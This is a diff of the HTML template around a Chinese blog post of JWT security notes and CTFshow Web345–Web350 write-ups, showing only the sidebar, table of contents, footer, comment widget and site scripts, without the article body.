-          一、什么是JWT?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81JWT%E5%AE%89%E5%85%A8"><span class="toc-number">1.2.</span> <span class="toc-text">
-          二、JWT安全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81CTFshow-%E9%A2%98%E8%A7%A3"><span class="toc-number">1.3.</span> <span class="toc-text">
-          二、CTFshow 题解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web345"><span class="toc-number">1.3.1.</span> <span class="toc-text">
-          Web345</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web346"><span class="toc-number">1.3.2.</span> <span class="toc-text">
-          Web346</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web347"><span class="toc-number">1.3.3.</span> <span class="toc-text">
-          Web347</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web348"><span class="toc-number">1.3.4.</span> <span class="toc-text">
-          Web348</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web349"><span class="toc-number">1.3.5.</span> <span class="toc-text">
-          Web349</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web350"><span class="toc-number">1.3.6.</span> <span class="toc-text">
-          Web350</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/photo.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">0dy5sey-yansui</p></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script></body></html>
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> JWT安全学习笔记</li>
+        <li><strong>作者:</strong> yansui</li>
+        <li><strong>创建于:</strong> 2023-07-20 10:57:34</li>
+        
+            <li>
+                <strong>更新于:</strong> 2023-07-20 11:00:02
+            </li>
+        
+        <li>
+            <strong>链接:</strong> http://yansui.xyz/2023/07/20/jwt/
+        </li>
+        <li>
+            <strong>版权声明:</strong> 本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a> 进行许可。
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2023/08/03/%E6%8E%A7%E5%AE%89%E5%91%A8%E8%B5%9B/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">TICPSH Week1</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                        rel="next"
+                        href="/2023/07/17/nodejs%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">CTF Node.js学习</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container">
+                <div class="comments-container pjax">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;评论
+    </div>
+    
+
+        
+            
+ 
+    <div id="waline"></div>
+    <script type="module"  data-swup-reload-script>
+        import { init } from 'https://evan.beee.top/js/waline.mjs';
+
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://example.example.com',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+            });
+        }
+
+        if ('true') {
+            const loadWalineTimeout = setTimeout(() => {
+                loadWaline();
+                clearTimeout(loadWalineTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadWaline);
+        }
+        
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">JWT安全学习笔记</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF-JWT%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="nav-text">CTF:JWT安全学习笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFJWT"><span class="nav-text">一、什么是JWT?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81JWT%E5%AE%89%E5%85%A8"><span class="nav-text">二、JWT安全</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81CTFshow-%E9%A2%98%E8%A7%A3"><span class="nav-text">二、CTFshow 题解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web345"><span class="nav-text">Web345</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web346"><span class="nav-text">Web346</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web347"><span class="nav-text">Web347</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web348"><span class="nav-text">Web348</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web349"><span class="nav-text">Web349</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web350"><span class="nav-text">Web350</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">yansui</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a> 驱动</span>
+                <br>
+            <span class="theme-version-container">主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.3.0</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+
+</main>
+
+
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+        ],
+        containers: ["#swup"],
+    });
+
+    swup.on("pageView", () => {
+        Global.refresh();
+    });
+
+    // if (document.readyState === "complete") {
+    //
+    // } else {
+    //     document.addEventListener("DOMContentLoaded", () => init());
+    // }
+</script>
+
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/navbarShrink.js"></script>
+
+<script src="/js/tools/scrollTopBottom.js"></script>
+
+<script src="/js/tools/lightDarkSwitch.js"></script>
+
+<script src="/js/layouts/categoryList.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+</body>
+</html>
